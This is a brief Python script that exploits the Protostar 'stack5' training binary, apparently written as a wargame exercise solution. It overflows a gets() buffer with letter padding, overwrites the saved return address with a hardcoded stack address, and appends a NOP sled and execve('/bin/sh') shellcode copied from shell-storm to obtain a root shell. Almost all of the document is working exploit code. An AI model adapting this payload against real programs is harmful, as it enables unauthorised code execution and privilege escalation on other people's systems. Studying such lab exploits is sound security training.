# /opt/protostar/bin/stack5
# Gains a root shell. Thanks to liveoverflow for the incredible writeup!

import struct
# Overflows at T, write 4 of every letter up to T
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
# The instruction pointer we control after gets()
eip = struct.pack("I", 0xbffff7e0)
# Create a nopslide to stop our env vars from getting in the way of the pointer
nop = "\x90"*100
# Shellcode taken very kindly from http://shell-storm.org/shellcode/files/shellcode-811.php - execve(/bin/sh)
shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# Print into the buffer
print padding+eip+nop+shell
